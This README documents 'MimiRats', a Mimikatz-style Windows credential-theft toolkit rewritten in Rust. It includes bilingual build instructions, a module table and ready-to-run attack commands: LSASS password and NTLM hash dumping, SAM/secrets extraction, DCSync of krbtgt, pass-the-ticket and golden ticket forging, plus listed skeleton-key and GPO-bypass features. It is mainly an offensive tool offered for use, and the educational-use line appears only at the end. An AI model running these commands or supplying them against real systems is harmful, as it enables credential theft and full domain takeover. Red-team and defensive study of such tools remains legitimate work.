# MimiRats

Windows credential toolkit written in Rust.

```
  .#####.   MimiRats 0.1.0 (x64) - Rust edition
 .## ^ ##.  "Rewritten in Rust"
 ## / \ ##  Windows credential toolkit
 ## \ / ##
 '## v ##'
  '#####'
```

## Overview

MimiRats is a Rust reimplementation providing an interactive REPL and batch command-line interface. Commands follow the `module::command [/arg:value ...]` syntax.

**25 modules, 188 commands.**

## Quick start

```
> MimiRats.exe
mimrats # privilege::debug
mimrats # sekurlsa::logonPasswords
mimrats # exit
```

```
> MimiRats.exe "privilege::debug" "sekurlsa::logonPasswords" "exit"
```

## Build

```bash
# Cross-compile from macOS/Linux
rustup target add x86_64-pc-windows-gnu
cargo build --release

# Build on Windows
cargo build --release --target x86_64-pc-windows-msvc

# Run unit tests (host target)
cargo test --target "$(rustc -vV | grep host | awk '{print $2}')"
```

## Module reference

| Module | Cmds | Description |
|--------|------|-------------|
| `standard` | 8 | Built-in commands (exit, cls, version, coffee, ...) |
| `privilege` | 9 | Privilege management (debug, driver, backup, ...) |
| `token` | 3 | Token manipulation (whoami, list, revert) |
| `process` | 5 | Process management (list, start, stop, suspend, resume) |
| `sekurlsa` | 20 | LSASS credential extraction |
| `lsadump` | 16 | SAM/Secrets/Cache/DCSync |
| `kerberos` | 11 | Kerberos ticket operations |
| `crypto` | 14 | Cryptographic providers, certificates, hashing |
| `dpapi` | 1 | DPAPI masterkey information |
| `ngc` | 5 | Windows Hello / NGC |
| `service` | 9 | Windows service management |
| `ts` | 4 | Terminal Server / RDP |
| `event` | 2 | Event log operations |
| `misc` | 8 | GPO bypass, memssp, skeleton key |
| `vault` | 3 | Windows Vault / Credential Manager |
| `minesweeper` | 1 | MineSweeper memory reader |
| `net` | 6 | SAM/Net API (users, groups, sessions) |
| `busylight` | 4 | BusyLight USB device |
| `sysenv` | 4 | UEFI system environment variables |
| `sid` | 4 | SID lookup and manipulation |
| `iis` | 1 | IIS configuration passwords |
| `rpc` | 3 | RPC server/client |
| `sr98` | 4 | SR98 RF device / T5577 |
| `rdm` | 2 | RDM 830 AL RF device |
| `acr` | 2 | ACR smartcard device |

---

## 詳細ドキュメント

### 使い方

#### 対話モード

```
> MimiRats.exe
mimrats # privilege::debug
mimrats # sekurlsa::logonPasswords
mimrats # exit
```

#### コマンドラインモード

引数にコマンドを渡すとバッチ実行される。最後に `exit` を指定するとそのまま終了する。

```
> MimiRats.exe "privilege::debug" "sekurlsa::logonPasswords" "exit"
```

### 主要コマンド例

```bash
# 資格情報の抽出
privilege::debug
sekurlsa::logonPasswords          # 全プロバイダの資格情報
sekurlsa::msv                     # NTLM ハッシュ
sekurlsa::wdigest                 # WDigest 平文パスワード
sekurlsa::kerberos                # Kerberos 資格情報
sekurlsa::minidump /in:lsass.dmp  # ミニダンプから抽出

# SAM / Secrets / Cache ダンプ（オフラインハイブ対応）
lsadump::sam /system:SYSTEM /sam:SAM
lsadump::secrets /system:SYSTEM /security:SECURITY
lsadump::cache /system:SYSTEM /security:SECURITY

# DCSync
lsadump::dcsync /user:domain\krbtgt /domain:lab.local

# Kerberos 操作
kerberos::list
kerberos::ptt /ticket:ticket.kirbi
kerberos::golden /admin:admin /domain:lab.local /sid:S-1-5-21-... /krbtgt:hash /ticket:golden.kirbi

# Vault / 資格情報マネージャー
vault::list
vault::cred

# 暗号ハッシュ計算
crypto::hash /password:test /user:admin /domain:WORKGROUP

# プロセス管理
process::list
process::start /cmd:notepad.exe
process::stop /pid:1234

# トークン操作
token::whoami
token::list
token::revert

# サービス管理
service::list
service::start /name:SvcName
service::stop /name:SvcName
```

### ビルド

#### 前提条件

- Rust ツールチェイン (edition 2021)
- Windows ターゲットの場合: `x86_64-pc-windows-gnu` ターゲットと MinGW リンカ

#### macOS/Linux からのクロスコンパイル

```bash
rustup target add x86_64-pc-windows-gnu
cargo build --release
```

デフォルトのビルドターゲットは `x86_64-pc-windows-gnu` (`.cargo/config.toml` で設定済み)。

#### Windows 上でのビルド

```bash
cargo build --release --target x86_64-pc-windows-msvc
```

#### ユニットテスト実行

ビルドターゲットがクロスコンパイル用に設定されているため、ホストターゲットを明示的に指定する必要がある。

```bash
cargo test --target "$(rustc -vV | grep host | awk '{print $2}')"
```

### アーキテクチャ

```
src/
  main.rs          REPL とコマンドディスパッチャ
  module.rs        Module/Command 型定義
  output.rs        バナーとバージョン定数
  win32.rs         Windows API ヘルパー
  crypto.rs        暗号プリミティブ (MD4, AES, RC4, DES, HMAC, PBKDF2, ...)
  registry.rs      レジストリハイブパーサー（オフライン）とライブレジストリアクセス
  memory.rs        プロセスメモリ読み取りとミニダンプリーダー
  display.rs       16進ダンプ、SID/GUID/FILETIME フォーマット
  modules/
    mod.rs         モジュールレジストリ（25モジュール）
    standard.rs    組み込みコマンド
    privilege.rs   権限昇格
    token.rs       トークン偽装
    process.rs     プロセス管理
    sekurlsa.rs    LSASS 資格情報抽出
    lsadump.rs     SAM/Secrets/Cache/DCSync
    kerberos.rs    Kerberos 操作
    crypto.rs      暗号モジュールコマンド
    vault.rs       資格情報 Vault
    dpapi.rs       DPAPI マスターキー
    ngc.rs         Windows Hello/NGC
    service.rs     サービス管理
    event.rs       イベントログ
    sysenv.rs      UEFI 環境変数
    sid.rs         SID 操作
    net.rs         SAM/Net API
    ts.rs          ターミナルサービス
    misc.rs        その他ツール
    iis.rs         IIS 設定パーサー
    rpc.rs         RPC 操作
    minesweeper.rs マインスイーパーリーダー
    busylight.rs   BusyLight デバイス
    sr98.rs        SR98 RF デバイス
    rdm.rs         RDM RF デバイス
    acr.rs         ACR デバイス
```

### テスト

機能テストは `tests/run_tests.ps1` (PowerShell、Windows 管理者権限が必要)。オフラインレジストリハイブパースを含む全実装モジュールをカバーしている。

```powershell
.\tests\run_tests.ps1
```

### ライセンス

本プロジェクトは教育および許可されたセキュリティテスト目的でのみ使用すること。
